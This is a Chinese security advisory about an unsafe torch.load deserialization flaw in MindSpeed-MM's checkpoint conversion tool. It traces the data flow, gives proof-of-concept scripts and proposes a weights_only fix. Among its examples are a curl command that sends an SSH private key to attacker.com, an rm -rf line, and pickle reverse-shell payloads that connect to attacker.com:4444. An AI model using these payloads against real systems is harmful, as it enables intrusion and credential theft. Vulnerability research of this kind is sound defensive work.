# checkpoint-vuln-002: Unsafe Deserialization - `load_from_hf`

**严重性**: High | **CWE**: CWE-502 | **置信度**: 85/100
**位置**: `checkpoint/vlm_model/hf_to_mm.py:316-317` @ `load_from_hf`

---

## 1. 漏洞概述

### 漏洞类型
不安全反序列化漏洞 (Unsafe Deserialization, CWE-502)

### 漏洞描述
该漏洞位于 MindSpeed-MM 的 checkpoint 转换工具中。`load_from_hf()` 函数在加载 `.pt` 格式的模型权重文件时使用 `torch.load()` 但未设置 `weights_only=True` 参数。

PyTorch 的 `torch.load()` 函数默认使用 pickle 反序列化机制，而 pickle 反序列化是已知的不安全操作——恶意构造的 `.pt` 文件可以包含任意 Python 代码，在加载时自动执行。攻击者可以通过提供包含恶意 payload 的 checkpoint 文件，在用户加载模型时执行任意代码。

### 漏洞代码位置
```
文件: checkpoint/vlm_model/hf_to_mm.py
行号: 316
函数: load_from_hf
代码: weight = torch.load(pt_path)  # 无 weights_only 参数
```

---

## 2. 漏洞代码分析

### 漏洞函数定义

**文件**: `checkpoint/vlm_model/hf_to_mm.py` (行 312-322)

```python
def load_from_hf(hf_dir: Path, pt_path: Optional[Path] = None) -> STATE_DICT_T:
    # 注意AutoModel.from_pretrained转换成模型对象时，存在torch_dtype问题需确认
    # 因此这里直接读取safetensors确保dtype一致
    state_dict = {}
    if pt_path:
        weight = torch.load(pt_path)  # ⚠️ 漏洞点：无 weights_only 参数
        state_dict.update(weight, device='cpu')
    else:
        files = list(hf_dir.glob("*.safetensors"))
        for safe_path in files:
            state_dict.update(load_file(str(safe_path), device='cpu'))
    return state_dict
```

### 漏洞触发条件

| 条件 | 说明 |
|------|------|
| `pt_path` 不为 None | 用户提供了 `.pt` 文件路径 |
| `torch.load()` 默认行为 | 未设置 `weights_only=True`，默认为 `False` |
| pickle 反序列化 | 当 `weights_only=False` 时，使用 pickle 反序列化 |

### 相关调用点

**行 362-368**: `convert_hf_to_mm` 函数调用 `load_from_hf`

```python
def convert_hf_to_mm(convert_config: ConvertVppMMConfig, ops: List[Operator], 
                     tp_patterns: Dict[str, Callable], stages: List[PPStageSchema]):
    pt_path = getattr(convert_config, 'pt_path', None)  # ⚠️ 从配置获取 pt_path
    parallel_config = convert_config.parallel_config
    num_experts = convert_config.common_model_config.num_experts
    # 加载权重字典
    state_dict = load_from_hf(convert_config.hf_config.hf_dir, pt_path)  # ⚠️ 调用漏洞函数
    ...
```

---

## 3. 完整数据流分析

### 数据流图

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         数据流：CLI → torch.load()                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  [阶段1] CLI 入口                                                        │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ checkpoint/convert_cli.py                                       │   │
│  │ ─────────────────────────                                       │   │
│  │ jsonargparse.auto_cli(Commandable.subclasses, as_positional=False)│   │
│  │ # 解析命令行参数，包括 --pt_path                                  │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                              ↓                                          │
│  [阶段2] 转换器注册                                                       │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ checkpoint/vlm_model/converters/videoalign.py                   │   │
│  │ ───────────────────────────────────────                         │   │
│  │ class ConvertVppMMConfigVideoAlign(ConvertVppMMConfigQwen2):    │   │
│  │     pt_path: Optional[Path] = None  # ⚠️ 定义 CLI 参数 pt_path   │   │
│  │     """pt/pth权重文件路径"""                                     │   │
│  │                                                                 │   │
│  │ class VideoAlignConverter(Converter):                           │   │
│  │     @staticmethod                                               │   │
│  │     def hf_to_mm(cfg: ConvertVppMMConfigVideoAlign):            │   │
│  │         ...                                                     │   │
│  │         convert_hf_to_mm(cfg, ops, ...)  # 调用核心转换函数      │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                              ↓                                          │
│  [阶段3] 配置解析                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ convert_hf_to_mm @ hf_to_mm.py:362                              │   │
│  │ ───────────────────────────────────                             │   │
│  │ pt_path = getattr(convert_config, 'pt_path', None)              │   │
│  │ # 从配置对象获取 CLI 参数 pt_path                                 │   │
│  │ # ⚠️ 用户可通过 --pt_path 指定任意路径                            │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                              ↓                                          │
│  [阶段4] 函数调用                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ load_from_hf @ hf_to_mm.py:312                                  │   │
│  │ ───────────────────────────────────                             │   │
│  │ def load_from_hf(hf_dir: Path, pt_path: Optional[Path] = None): │   │
│  │     if pt_path:                                                 │   │
│  │         weight = torch.load(pt_path)  # ⚠️ VULN                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                              ↓                                          │
│  [阶段5] Pickle 反序列化                                                  │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ torch.load() 内部行为                                           │   │
│  │ ───────────────────                                             │   │
│  │ # torch.load() 默认参数                                         │   │
│  │ torch.load(f, map_location=None, picklemodule=None,            │   │
│  │             weights_only=False, ...)  # ⚠️ weights_only=False  │   │
│  │                                                                 │   │
│  │ # 当 weights_only=False 时：                                    │   │
│  │ # 1. 使用 Python pickle 模块反序列化                             │   │
│  │ # 2. pickle 可以执行任意 Python 代码                             │   │
│  │ # 3. 通过 __reduce__ 方法触发任意函数调用                         │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                              ↓                                          │
│  [阶段6] 代码执行                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ 恶意 Payload 执行                                                │   │
│  │ ───────────────────                                             │   │
│  │ # 恶意 .pt 文件中的 __reduce__ payload 被执行                    │   │
│  │ # 示例 payload：                                                 │   │
│  │ os.system('curl attacker.com/steal?data=$(cat ~/.ssh/id_rsa)') │   │
│  │ # 或                                                             │   │
│  │ eval("__import__('os').system('rm -rf /important_data')")       │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### CLI 参数传递路径

```
用户命令行:
python checkpoint/convert_cli.py VideoAlignConverter.hf_to_mm \
    --cfg.hf_config.hf_dir=/path/to/model \
    --cfg.pt_path=/malicious/exploit.pt \  # ⚠️ 恶意文件路径
    --cfg.mm_dir=/output/path \
    ...

↓ jsonargparse 解析

↓ 生成 ConvertVppMMConfigVideoAlign 对象:
    cfg.pt_path = Path("/malicious/exploit.pt")

↓ VideoAlignConverter.hf_to_mm(cfg)
    convert_hf_to_mm(cfg, ops, patterns, stages)

↓ convert_hf_to_mm @ hf_to_mm.py:364
    pt_path = getattr(convert_config, 'pt_path', None)
    # pt_path = Path("/malicious/exploit.pt")

↓ load_from_hf @ hf_to_mm.py:316
    weight = torch.load(pt_path)  # ⚠️ 触发漏洞
```

---

## 4. PyTorch torch.load() 安全机制详解

### torch.load() 函数签名

```python
torch.load(
    f,
    map_location=None,
    picklemodule=None,
    weights_only=False,  # ⚠️ 默认为 False，允许 pickle 反序列化
    mmap=None,
    *,
    encoding='utf-8',
    ...
)
```

### weights_only 参数说明

| 参数值 | 行为 | 安全性 |
|--------|------|--------|
| `weights_only=False` (默认) | 使用 pickle 反序列化，允许执行任意代码 | **不安全** |
| `weights_only=True` | 只加载 tensor 数据，禁止执行任意代码 | **安全** |

### Pickle 反序列化风险

Python 的 pickle 模块在反序列化时会执行 `__reduce__` 方法返回的函数：

```python
class MaliciousObject:
    def __reduce__(self):
        # 返回 (callable, args) tuple
        # pickle 反序列化时执行 callable(*args)
        return (os.system, ('touch /tmp/pwned',))

# 当 pickle.loads() 反序列化包含此对象的序列化数据时
# 会自动执行 os.system('touch /tmp/pwned')
```

---

## 5. 攻击场景分析

### 攻击者画像
- **类型**: 供应链攻击者、恶意模型提供者
- **动机**: 窃取敏感数据、植入后门、破坏系统

### 攻击向量
1. **供应链攻击**: 在公开模型仓库中上传恶意 checkpoint
2. **共享存储**: 在共享存储中放置恶意文件
3. **邮件/即时通讯**: 发送恶意 checkpoint 文件给目标用户

### 攻击步骤

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          攻击步骤流程图                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  步骤1: 构造恶意 Payload                                                 │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ class Exploit:                                                  │   │
│  │     def __reduce__(self):                                       │   │
│  │         return (eval, (                                         │   │
│  │             "import socket, os, subprocess;\                    │   │
│  │              s=socket.socket();\                                │   │
│  │              s.connect(('attacker.com', 4444));\                │   │
│  │              os.dup2(s.fileno(),0);\                            │   │
│  │              os.dup2(s.fileno(),1);\                            │   │
│  │              os.dup2(s.fileno(),2);\                            │   │
│  │              subprocess.call(['/bin/bash'])"                    │   │
│  │         ))                                                      │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                              ↓                                          │
│  步骤2: 生成恶意 Checkpoint                                              │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ malicious_dict = {                                              │   │
│  │     '__exploit__': Exploit(),                                   │   │
│  │     'model.weight': torch.randn(10, 10)  # 正常权重伪装          │   │
│  │ }                                                               │   │
│  │ torch.save(malicious_dict, 'videoalign_checkpoint.pt')         │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                              ↓                                          │
│  步骤3: 传播恶意文件                                                     │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ - 上传到 Hugging Face Hub / GitHub                              │   │
│  │ - 发送给目标用户                                                 │   │
│  │ - 放入共享存储                                                   │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                              ↓                                          │
│  步骤4: 用户执行转换                                                     │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ python checkpoint/convert_cli.py VideoAlignConverter.hf_to_mm \ │   │
│  │     --cfg.hf_config.hf_dir=./clean_model \                      │   │
│  │     --cfg.pt_path=./videoalign_checkpoint.pt \  # ⚠️ 恶意文件   │   │
│  │     --cfg.mm_dir=./output                                       │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                              ↓                                          │
│  步骤5: 漏洞触发                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ torch.load(pt_path) → pickle 反序列化 → Exploit.__reduce__()   │   │
│  │ → eval(...) → 反向 Shell 连接 attacker.com:4444                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 6. 利用条件评估

### 利用难度: 低

| 条件类型 | 要求 | 实际情况 | 评估 |
|----------|------|----------|------|
| 攻击者能力 | 能构造恶意 pickle payload | Python 基础知识即可 | 易 |
| 文件访问 | 能提供恶意 .pt 文件给目标 | 通过共享存储、邮件等 | 易 |
| 用户交互 | 用户使用 pt_path 参数 | VideoAlign 模型转换场景 | 中 |
| 环境依赖 | PyTorch 环境 | MindSpeed-MM 必需依赖 | 自动满足 |

### 触发条件

1. **用户指定 pt_path**: 用户在进行 VideoAlign 模型转换时需要指定 `--cfg.pt_path` 参数
2. **恶意文件可达**: 恶意 `.pt` 文件在用户可访问的路径
3. **执行转换命令**: 用户运行 checkpoint 转换 CLI

---

## 7. 影响评估

### 影响范围

| 影响维度 | 等级 | 说明 |
|----------|------|------|
| **机密性** | 高 | 恶意代码可读取系统文件、SSH 密钥、环境变量、训练数据 |
| **完整性** | 高 | 恶意代码可修改模型权重、篡改训练数据、植入后门 |
| **可用性** | 高 | 恶意代码可删除文件、加密勒索、破坏系统 |

### 可能的攻击后果

1. **数据窃取**: 窃取 SSH 私钥、API 密钥、训练数据
2. **系统入侵**: 建立反向 Shell，持久化控制
3. **供应链污染**: 在模型中植入后门，影响下游用户
4. **勒索攻击**: 加密或删除重要数据

---

## 8. PoC (概念验证)

### PoC 1: 基础 Payload

```python
#!/usr/bin/env python
# poc_create_malicious_checkpoint.py
"""创建恶意 checkpoint 文件用于验证漏洞"""

import torch
import os

class BasicPayload:
    """基础测试 Payload"""
    def __reduce__(self):
        return (os.system, ('echo "VULN_CHECKPOINT_002_CONFIRMED" > /tmp/vuln_marker.txt',))

def create_malicious_checkpoint(output_path: str = 'exploit_checkpoint_002.pt'):
    """创建包含恶意 payload 的 checkpoint"""
    
    # 正常权重数据用于伪装
    normal_weights = {
        'model.weight': torch.randn(1024, 1024),
        'model.bias': torch.randn(1024),
    }
    
    # 添加恶意 payload
    malicious_checkpoint = {
        **normal_weights,
        '__payload__': BasicPayload()
    }
    
    torch.save(malicious_checkpoint, output_path)
    print(f"[+] Created malicious checkpoint: {output_path}")
    return output_path

if __name__ == '__main__':
    create_malicious_checkpoint()
```

### PoC 2: 反向 Shell Payload

```python
#!/usr/bin/env python
# poc_reverse_shell.py
"""创建反向 Shell Payload（仅用于安全测试）"""

import torch

class ReverseShellPayload:
    """反向 Shell Payload"""
    def __reduce__(self):
        shell_code = """
import socket, os, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('ATTacker_IP', 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/bash', '-i'])
"""
        return (eval, (shell_code,))

def create_reverse_shell_checkpoint(output_path: str = 'shell_checkpoint.pt'):
    malicious_checkpoint = {
        'model.weight': torch.randn(100, 100),
        '__shell__': ReverseShellPayload()
    }
    torch.save(malicious_checkpoint, output_path)
    return output_path
```

### PoC 3: 触发漏洞的完整测试脚本

```python
#!/usr/bin/env python
# poc_trigger_vulnerability.py
"""触发漏洞的完整测试脚本"""

import sys
import os
import torch
from pathlib import Path

# 添加项目路径
sys.path.insert(0, '/home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM')

class TestPayload:
    def __reduce__(self):
        return (os.system, ('echo "[VULN-002] PAYLOAD EXECUTED AT $(date)" > /tmp/vuln_002_marker && id >> /tmp/vuln_002_marker',))

def create_test_checkpoint():
    """创建测试 checkpoint"""
    checkpoint = {
        'model.layer1.weight': torch.randn(256, 256),
        'model.layer2.weight': torch.randn(256, 256),
        '__test_payload__': TestPayload()
    }
    test_path = '/tmp/test_checkpoint_002.pt'
    torch.save(checkpoint, test_path)
    print(f"[+] Created test checkpoint: {test_path}")
    return test_path

def trigger_vulnerability():
    """触发漏洞"""
    from checkpoint.vlm_model.hf_to_mm import load_from_hf
    
    # 创建测试 checkpoint
    test_pt_path = Path(create_test_checkpoint())
    
    # 检查初始状态
    marker_path = '/tmp/vuln_002_marker'
    if os.path.exists(marker_path):
        os.remove(marker_path)
    
    print("[*] Attempting to load malicious checkpoint...")
    
    # 触发漏洞
    try:
        state_dict = load_from_hf(Path('.'), test_pt_path)
        print(f"[+] Loaded state_dict with keys: {list(state_dict.keys())[:3]}")
    except Exception as e:
        print(f"[!] Error during loading: {e}")
    
    # 检查 payload 是否执行
    if os.path.exists(marker_path):
        print("[!] VULNERABILITY CONFIRMED!")
        print("[!] Payload executed successfully!")
        with open(marker_path, 'r') as f:
            print(f.read())
        return True
    else:
        print("[*] Payload not executed (might be weights_only=True)")
        return False

if __name__ == '__main__':
    print("=" * 60)
    print("Vulnerability Test for checkpoint-vuln-002")
    print("=" * 60)
    
    result = trigger_vulnerability()
    
    if result:
        print("\n[!] RESULT: Vulnerability CONFIRMED - Arbitrary code execution possible!")
    else:
        print("\n[+] RESULT: Vulnerability mitigated or payload blocked")
```

---

## 9. 验证环境搭建

### 环境要求

```
操作系统: Ubuntu 22.04 / CentOS 8
Python: 3.10+
PyTorch: 2.0+
MindSpeed-MM: 当前版本
```

### 搭建步骤

```bash
# 1. 安装依赖
pip install torch safetensors pydantic jsonargparse tqdm

# 2. 克隆/进入项目目录
cd /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM

# 3. 创建测试环境
mkdir -p /tmp/test_vuln_002
cd /tmp/test_vuln_002

# 4. 生成测试 checkpoint
python poc_create_malicious_checkpoint.py

# 5. 运行漏洞测试
python poc_trigger_vulnerability.py
```

### 验证检查点

```bash
# 检查 payload 是否执行
ls -la /tmp/vuln_marker.txt
cat /tmp/vuln_marker.txt

# 预期输出:
# VULN_CHECKPOINT_002_CONFIRMED
```

---

## 10. 修复建议

### 立即修复方案

```python
# 安全版本的 load_from_hf 函数
def load_from_hf(hf_dir: Path, pt_path: Optional[Path] = None) -> STATE_DICT_T:
    """安全的模型权重加载函数"""
    state_dict = {}
    if pt_path:
        # ✅ 添加 weights_only=True 参数
        weight = torch.load(pt_path, weights_only=True)
        state_dict.update(weight, device='cpu')
    else:
        files = list(hf_dir.glob("*.safetensors"))
        for safe_path in files:
            state_dict.update(load_file(str(safe_path), device='cpu'))
    return state_dict
```

### 修复代码变更

```diff
--- checkpoint/vlm_model/hf_to_mm.py (原始版本)
+++ checkpoint/vlm_model/hf_to_mm.py (修复版本)

@@ -314,7 +314,7 @@ def load_from_hf(hf_dir: Path, pt_path: Optional[Path] = None) -> STATE_DICT_T:
     state_dict = {}
     if pt_path:
-        weight = torch.load(pt_path)
+        weight = torch.load(pt_path, weights_only=True)
         state_dict.update(weight, device='cpu')
     else:
         files = list(hf_dir.glob("*.safetensors"))
```

### 长期安全建议

1. **强制使用 safetensors 格式**
   - `.safetensors` 格式不支持 pickle 反序列化
   - 修改代码默认使用 safetensors 格式

2. **添加文件完整性校验**
   ```python
   def load_from_hf_secure(hf_dir: Path, pt_path: Optional[Path] = None,
                           expected_hash: Optional[str] = None) -> STATE_DICT_T:
       if pt_path:
           if expected_hash:
               actual_hash = compute_file_hash(pt_path)
               if actual_hash != expected_hash:
                   raise SecurityError("Checkpoint integrity check failed!")
           weight = torch.load(pt_path, weights_only=True)
           ...
   ```

3. **用户安全警告**
   - 在文档中明确警告用户不要加载未知来源的 `.pt` 文件
   - 在 CLI 中添加安全提示

---

## 11. 相关漏洞关联

| 漏洞 ID | 文件 | 位置 | 描述 |
|---------|------|------|------|
| checkpoint-vuln-001 | mm_to_hf.py | 92, 107 | `torch.load(weights_only=False)` |
| checkpoint-vuln-003 | merge_base_lora_weight.py | 88-92 | 4处 `torch.load()` 无 weights_only |
| checkpoint-vuln-004 | save_load_utils.py | 36, 152 | `torch.load()` 无 weights_only |
| VULN-CHECKPOINT-001 | mm_to_hf.py | 92 | `torch.load(weights_only=False)` |
| VULN-CHECKPOINT-003 | hf_to_mm.py | 316 | 同本漏洞 |

---

## 12. 总结

### 漏洞确认状态: ✅ 真实漏洞

### 关键发现

| 发现项 | 结论 |
|--------|------|
| 漏洞存在 | ✅ 确认 `torch.load(pt_path)` 无 `weights_only=True` |
| 参数可控 | ✅ `pt_path` 来自 CLI 参数 `--cfg.pt_path` |
| 利用可行 | ✅ 可通过恶意 `.pt` 文件执行任意代码 |
| 影响严重 | ✅ 可导致 RCE、数据窃取、系统入侵 |

### 修复优先级: High

该漏洞应在下一版本中立即修复。
